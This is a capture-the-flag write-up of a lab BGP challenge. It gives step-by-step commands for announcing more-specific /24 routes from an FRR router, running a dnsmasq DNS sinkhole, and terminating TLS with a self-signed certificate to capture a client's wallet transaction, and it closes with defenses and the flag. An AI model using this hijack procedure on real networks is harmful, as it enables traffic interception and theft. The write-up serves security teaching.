# Sasthereum Wallet Gateway

**Category:** Network / BGP
**Flag:** `SAS{99be0e87-6466-4383-af72-241c7ab05a7a}`

## Challenge

> You've recently taken a job as a network engineer at a small regional ISP.
> During a routine audit of your edge router, you notice something interesting.
> Word on the street is that CryptoCloud Inc. runs their Sasthereum wallet
> gateway somewhere on the network. Their DNS infrastructure handles resolution
> for `cryptowallet.ctf`. Your router is ready and waiting. You also have access
> to a tools server for running whatever services you might need.

You're given SSH access to two boxes via a TLS-wrapped jumphost:

- **Router** — Alpine Linux running FRR 10.0 (zebra, bgpd, staticd, mgmtd). User
  is in the `frrvty` group, so vtysh works. No sudo.
- **Tools server** — Alpine Linux with `dnsmasq`, `nginx`, `python3`, `tcpdump`,
  `iptables`. Passwordless `sudo ALL`.

```
                /------------------------\
                | AS 64501 - CryptoCloud |
                |    DNS: 10.0.1.0/22    |
                |    Web: 10.0.2.0/24    |
                \------------------------/
                          |
        v-----------------<----------------v
        |                                  |
   AS 64502 - GlobalNet           AS 64503 - RegionalLink
                                    |              |
                                    |              v
                                    v       AS 64506 - UserNet
                              AS 64504 - Metro-IX  (client 10.0.6.0/24)
                                    |
                                    v
                              AS 64505 - YOUR ISP     <-- us
                              Router: 10.100.35.2 / 10.100.45.2
                              Tools:  10.0.5.100
```

Targets:

- `cryptowallet.ctf` (wallet gateway, `10.0.2.80`)
- `10.0.1.53` — CryptoCloud's authoritative DNS

A client at `10.0.6.100` periodically resolves `cryptowallet.ctf` and posts a
transaction to it.

## Recon

The router's FRR config (`/etc/frr/frr.conf`) already had hijack scaffolding
in place:

```
ip prefix-list HIJACK-ALL    seq 1 permit 10.0.1.0/24
ip prefix-list HIJACK-ALL    seq 2 permit 10.0.2.0/24
ip prefix-list HIJACK-WALLET seq 1 permit 10.0.2.0/24

router bgp 64505
 neighbor 10.100.35.1 remote-as 64503   ! RegionalLink (DOWN)
 neighbor 10.100.45.1 remote-as 64504   ! Metro-IX     (UP)
 address-family ipv4 unicast
  network 10.0.1.0/24
  network 10.0.2.0/24
  network 10.0.5.0/24
  neighbor 10.100.35.1 route-map EXPORT-REGIONAL out
  neighbor 10.100.45.1 route-map EXPORT-IXP out
```

Both hijack `/24`s are more-specific than CryptoCloud's `10.0.1.0/22`, so the
plan is built in: longest-prefix match means routers worldwide will prefer
*our* announcement.

But `show ip bgp` shows the `/24`s as **inactive** (no `*>` flag) — FRR's
`network X` statement only originates a prefix if a matching route exists in
the kernel RIB. Nothing in `ip route` matches `10.0.1.0/24` or `10.0.2.0/24`,
so neither was being advertised.

```
*>  10.0.5.0/24      0.0.0.0          ...   i
    10.0.1.0/24      0.0.0.0          ...   i   <-- no *>
    10.0.2.0/24      0.0.0.0          ...   i   <-- no *>
*>  10.0.6.0/24      10.100.45.1      ... 64504 64506 i
```

RegionalLink BGP was down (`Active` state), but Metro-IX was Established and
*does* reflect our routes to RegionalLink (route-server topology), so the
client's traffic path was reachable.

## Exploitation

### 1. Bind the hijacked IPs on the tools server

The kernel won't generate routes for `10.0.1.0/24` / `10.0.2.0/24` unless
those subnets are reachable. The simplest way: bind the specific service IPs
to a dummy interface on the tools box, then point a static route at it.

```sh
sudo ip link add dummy0 type dummy
sudo ip link set dummy0 up
sudo ip addr add 10.0.1.53/32 dev dummy0   # CryptoCloud DNS
sudo ip addr add 10.0.2.80/32 dev dummy0   # CryptoCloud wallet
```

### 2. Originate the hijack via static routes on the router

```
vtysh -c "configure terminal" \
      -c "ip route 10.0.1.0/24 10.0.5.100" \
      -c "ip route 10.0.2.0/24 10.0.5.100" \
      -c "end" -c "write memory"
```

`show ip bgp` immediately picks them as best, and
`show ip bgp neighbors 10.100.45.1 advertised-routes` confirms they're going
out to Metro-IX:

```
*>  10.0.1.0/24      0.0.0.0    0    32768  i
*>  10.0.2.0/24      0.0.0.0    0    32768  i
*>  10.0.5.0/24      0.0.0.0    0    32768  i
```

### 3. DNS hijack with dnsmasq

```
port=53
no-resolv
no-hosts
listen-address=10.0.1.53
bind-interfaces
address=/cryptowallet.ctf/10.0.2.80
log-queries
```

Within ~30 s the dnsmasq log showed the client resolving from `10.0.6.100`:

```
dnsmasq: query[A] cryptowallet.ctf from 10.0.6.100
dnsmasq: config cryptowallet.ctf is 10.0.2.80
```

The BGP hijack worked end-to-end — the client's DNS query traversed
UserNet → RegionalLink → Metro-IX → our router → our DNS sinkhole.

### 4. First capture: TLS ClientHello, no payload

A first listener bound on `10.0.2.80:80/443/8080/8443/8000` showed the client
hitting `:443` with a TLS 1.3 ClientHello (ALPN `http/1.1`, no SNI checked).
We could not see plaintext until we terminated TLS.

### 5. TLS termination with self-signed cert

```sh
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 \
  -subj "/CN=cryptowallet.ctf" \
  -addext "subjectAltName=DNS:cryptowallet.ctf,DNS:*.cryptowallet.ctf,IP:10.0.2.80"
```

A small Python TLS terminator (`tls_listener.py`) wrapped each incoming
socket with `ssl.SSLContext.wrap_socket(..., server_side=True)`, advertised
`http/1.1` via ALPN, and logged the full request.

The client (`python-requests/2.32.3`) does **not** verify the cert — first
TLS handshake produced the payload:

```http
POST /api/v1/transaction HTTP/1.1
User-Agent: python-requests/2.32.3
Host: cryptowallet.ctf
Content-Type: application/json
Content-Length: 128

{"wallet": "0xd3CdA913deB6f67967B99D67aCDFa1712C293601",
 "amount": "1.337",
 "memo": "SAS{99be0e87-6466-4383-af72-241c7ab05a7a}"}
```

## Flag

```
SAS{99be0e87-6466-4383-af72-241c7ab05a7a}
```

## Lessons / Defenses

- **RPKI** — CryptoCloud should publish ROAs for `10.0.1.0/22` with
  `maxLength = 22`. Any `/24` announcement would then be RPKI-invalid and
  dropped by Metro-IX route servers and RPKI-validating peers.
- **Prefix filtering at IXPs** — Metro-IX accepted a `/24` more-specific
  from a non-origin AS without IRR/RPKI validation.
- **No mutual TLS / no cert pinning** — `python-requests` accepted our
  self-signed cert. Real wallet clients should pin the certificate or use
  client certificates.
- **DNS over HTTPS / DNSSEC** — DNSSEC wouldn't fully save you here (you'd
  still hit our hijacked IP at the transport layer), but DoH to a trusted
  resolver outside the hijacked prefix would force the resolver path off
  CryptoCloud's own infrastructure.

## Artifacts

- [`artifacts/frr.conf`](artifacts/frr.conf) — pre-staged router config
- [`artifacts/dnsmasq.conf`](artifacts/dnsmasq.conf) — DNS hijack config
- [`artifacts/tls_listener.py`](artifacts/tls_listener.py) — TLS-terminating capture listener
- [`artifacts/setup.sh`](artifacts/setup.sh) — end-to-end exploit script
